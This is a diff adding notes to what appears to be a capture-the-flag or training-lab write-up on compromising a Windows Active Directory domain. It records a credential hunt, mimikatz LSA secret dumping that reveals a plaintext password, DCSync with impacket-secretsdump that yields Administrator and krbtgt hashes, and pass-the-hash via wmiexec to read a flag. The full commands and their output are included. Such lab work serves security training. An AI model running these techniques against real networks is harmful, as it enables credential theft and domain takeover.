@@ -334,3 +334,189 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
+No stored creds
+
+```
+C:\Windows\system32>cmdkey /list
+
+Currently stored credentials:
+
+* NONE *
+```
+
+Did [mimikatz dump](./mimikatz_dump_ms01.txt) of MS01 and found the following:
+
+`tpetty` with `NTLM` hash: fd37b6fec5704cadabb319cebf9e3a3a
+
+Got files and dirs under `tpetty`: see [here](./tpetty_files.txt).
+
+Tried to find creds:
+
+```
+C:\Windows\system32>powershell -c "Get-ChildItem C:\Users -Recurse -Include *.txt,*.xml,*.ini,*.ps1,*.bat,*.vbs -ErrorAction SilentlyContinue | Select-String -Pattern 'password|passwd|pwd|cred' -ErrorAction SilentlyContinue | Select-Object Path,Line"
+
+No results
+```
+
+Got scheduled tasks via `schtasks /query /fo LIST /v | findstr "TaskName Run As User"`
+
+see results here: [scheduled_tasks](./scheduled_task.txt)
+
+Autologon check:
+
+```
+C:\Windows\system32>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /s 2>nul | findstr "DefaultUserName DefaultPassword DefaultDomainName AutoAdminLogon"
+    AutoAdminLogon    REG_DWORD    0x1
+    DefaultDomainName    REG_SZ    INLANEFREIGHT
+    DefaultUserName    REG_SZ    tpetty
+```
+
+Check `tpetty` group membership
+
+```
+C:\Windows\system32>powershell -c "([adsisearcher]'(samaccountname=tpetty)').FindOne().Properties.memberof"
+
+C:\Windows\system32>
+```
+
+Dumped lsa and secrets via mimikatz
+
+```
+mimikatz # lsadump::secrets
+Domain : MS01
+SysKey : 9521a9e7c65245ab8cdd792e7f6d20df
+
+Local name : MS01 ( S-1-5-21-2240111961-1403977016-2242853117 )
+Domain name : INLANEFREIGHT ( S-1-5-21-2270287766-1317258649-2146029398 )
+Domain FQDN : INLANEFREIGHT.LOCAL
+
+Policy subsystem is : 1.18
+LSA Key(s) : 1, default {2cc06243-6b76-c52d-7226-e7c672fb703d}
+  [00] {2cc06243-6b76-c52d-7226-e7c672fb703d} 05281fef7a5260818ceaf3b4ec1ed8fdb46fe7aabc8ff4529e0a99036608d6e0
+
+Secret  : $MACHINE.ACC
+cur/hex : 47 bb bc b5 d7 f8 cd ca b4 40 b9 a3 8c 71 0b c6 3e 4c b5 e2 e2 0b 70 05 3c 73 dd ed df bb 68 3b ce 71 97 c3 21 43 52 29 83 3b c5 1b 4f f5 58 9a 7f d2 2f a8 87 d9 03 61 fe 18 8d 28 b0 32 8b 55 4b 8d 42 34 34 cc bb c6 0e a4 ea ff 01 a2 56 05 7e 6a dd dc 4b bb b8 35 b4 67 d5 55 89 2f a7 91 93 03 c2 04 05 ed a6 e8 dd 9b 57 f4 03 56 7f 9b 5b e5 d0 34 00 36 01 68 2e 0d c1 a6 e9 37 86 9d c5 5e 58 e6 f4 34 d3 f7 8f 34 81 23 83 d4 2c e5 00 d9 ce 24 a1 f7 5d b5 ad b0 e3 35 1e ee ad 98 30 7f 49 c0 42 e9 e7 63 ed 29 6e b7 83 2b e0 21 5b 2b 67 ff 40 dd e4 d8 75 03 2c fc a0 1a e1 19 b5 af 1a b8 be 21 51 70 a7 cf f8 51 e8 e0 5a 85 c7 ce 40 57 de cd 20 09 13 f7 89 15 2a 34 13 0f b2 7f 42 89 49 c7 46 b2 e3 a3 d1 7a 74 b8 eb dc
+    NTLM:4d57d378850625d1231a7a8577dbf650
+    SHA1:393a7c10414ceeadbbf4cbc0c2c313335d7e8ed0
+old/text: ^kF)nFYj_k Qd64RbS@&)(hnL0@xi=!Q]tQ\jdNFxroquWa@CdTv\Xr^rk;GXzr$mHFL5`P*;5dD]u6Nc_95IT\1jN0MgOJk"@(7jH1u4?3EY_7o8b5-fcL=
+    NTLM:ecfe27900016073fffef1bb4b2132bb2
+    SHA1:678b71f548a76f72cc3d2058121cf71ae896c310
+
+Secret  : DefaultPassword
+cur/text: Sup3rS3cur3D0m@inU2eR
+
+Secret  : DPAPI_SYSTEM
+cur/hex : 01 00 00 00 8d be 84 2a 73 52 00 0b e0 8e f8 0e 32 bb 35 60 9e 7d 17 86 b2 0d 19 9f 3d 95 3f 79 77 a6 36 3a 69 a9 fe 21 d9 7e cd 19
+    full: 8dbe842a7352000be08ef80e32bb35609e7d1786b20d199f3d953f7977a6363a69a9fe21d97ecd19
+    m/u : 8dbe842a7352000be08ef80e32bb35609e7d1786 / b20d199f3d953f7977a6363a69a9fe21d97ecd19
+old/hex : 01 00 00 00 51 9c 86 b4 cb dc 97 8b 35 9b c0 39 17 34 16 62 31 98 c1 07 ce 7d 9f 94 fc e7 2c d9 59 8a c6 07 10 78 7c 0d 9a 56 ce 0b
+    full: 519c86b4cbdc978b359bc039173416623198c107ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
+    m/u : 519c86b4cbdc978b359bc039173416623198c107 / ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
+
+Secret  : NL$KM
+cur/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 64 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
+old/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 64 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
+```
+
+```
+C:\Windows\system32>net user tpetty /domain
+The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.
+
+User name                    tpetty
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            3/30/2022 4:14:47 AM
+Password expires             Never
+Password changeable          3/31/2022 4:14:47 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   4/26/2026 6:51:47 PM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users
+The command completed successfully.
+```
+
+Got Administrator Hash for DC01. 
+
+```
+Got the admin hash.
+
+```
+└─$ impacket-secretsdump INLANEFREIGHT/tpetty:Sup3rS3cur3D0m@inU2eR@172.16.6.3 | tee impacket-secretsdump.log
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6dbd63f4a0e7c8b221d61f265c4a08a7:::
+```
+
+Couldn't crack admin hash.
+
+```
+Approaching final keyspace - workload adjusted.
+
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Mode........: 1000 (NTLM)
+Hash.Target......: 27dedb1dab4d8545c6e1c66fba077da0
+Time.Started.....: Mon Apr 27 11:02:42 2026 (5 secs)
+Time.Estimated...: Mon Apr 27 11:02:47 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:  3358.5 kH/s (0.24ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
+Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+Progress.........: 14344385/14344385 (100.00%)
+Rejected.........: 0/14344385 (0.00%)
+Restore.Point....: 14344385/14344385 (100.00%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...:  kristenanne -> $HEX[042a0337c2a156616d6f732103]
+
+Started: Mon Apr 27 11:02:28 2026
+Stopped: Mon Apr 27 11:02:48 2026
+```
+
+Got the flag via wmiexec PtH
+
+```
+└─$ impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0 Administrator@172.16.6.3
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>dir
+ Volume in drive C has no label.
+ Volume Serial Number is DA7F-3F25
+
+ Directory of C:\
+
+09/15/2018  12:12 AM    <DIR>          PerfLogs
+04/11/2022  05:54 PM    <DIR>          Program Files
+09/15/2018  12:21 AM    <DIR>          Program Files (x86)
+03/30/2022  01:50 AM    <DIR>          Users
+04/26/2026  08:02 PM    <DIR>          Windows
+               0 File(s)              0 bytes
+               5 Dir(s)  33,599,348,736 bytes free
+
+C:\>type C:\Users\Administrator\Desktop\flag.txt
+
+r3plicat1on_m@st3r!
+```
